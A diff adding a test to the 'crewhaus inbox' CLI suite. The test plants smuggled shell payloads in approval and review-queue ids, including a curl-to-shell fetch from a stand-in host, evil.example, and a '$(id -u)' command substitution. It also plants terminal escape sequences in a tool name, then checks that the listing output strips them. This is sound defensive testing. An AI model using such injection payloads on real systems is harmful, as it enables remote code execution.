@@ -218,6 +218,42 @@ describe("crewhaus inbox", () => {
     expect((await run(["stats", "--since", "forever"])).exitCode).toBe(55);
   });
 
+  test("ids a harness's files planted reach no command, and control characters never reach the terminal", async () => {
+    const a = harness("alpha");
+    await park(a.dir, { channel: "ops", text: "ship it" });
+    const file = join(a.dir, ".crewhaus", "sessions", "approvals.jsonl");
+    const lines = readFileSync(file, "utf8").trim().split("\n");
+    const last = JSON.parse(lines[lines.length - 1] as string) as Record<string, unknown>;
+    const plant = (over: Record<string, unknown>) =>
+      writeFileSync(file, `${readFileSync(file, "utf8")}${JSON.stringify({ ...last, ...over })}\n`);
+    plant({ id: "appr_0123456789abcdef;curl${IFS}evil.example|sh;#" });
+    plant({ id: "appr_00000000000000b1", toolName: "Send\u001b[2J\u009b31mMessage" });
+    const queue = join(a.dir, ".crewhaus", "review", "queue.jsonl");
+    mkdirSync(join(a.dir, ".crewhaus", "review"), { recursive: true });
+    writeFileSync(
+      queue,
+      `${JSON.stringify({
+        schemaVersion: 1,
+        id: "x; touch /tmp/pwned-$(id -u)",
+        kind: "abstained",
+        sourceRef: { runId: "run_1", sampleId: "s1" },
+        ts: new Date(NOW - 60_000).toISOString(),
+        status: "open",
+      })}\n`,
+    );
+    const text = (await run(["list"])).lines.join("\n");
+    expect(text).toContain("Permission to use SendMessage");
+    expect(text).toContain("Permission to use Send[2J31mMessage");
+    for (const bad of ["curl", "$(", "pwned", "\u001b", "\u009b"]) {
+      expect(`${bad}:${text.includes(bad)}`).toBe(`${bad}:false`);
+    }
+    const json = (await run(["list", "--json"])).lines.join("\n");
+    expect(JSON.parse(json)).toBeDefined();
+    // biome-ignore lint/suspicious/noControlCharactersInRegex: finding control characters is the point
+    expect(/[\u0000-\u0009\u000b-\u001f\u007f-\u009f]/.test(json)).toBe(false);
+    expect(json).not.toContain("curl");
+  });
+
   test("an empty inbox exits 0 and says so", async () => {
     harness("quiet");
     const out = await run([]);
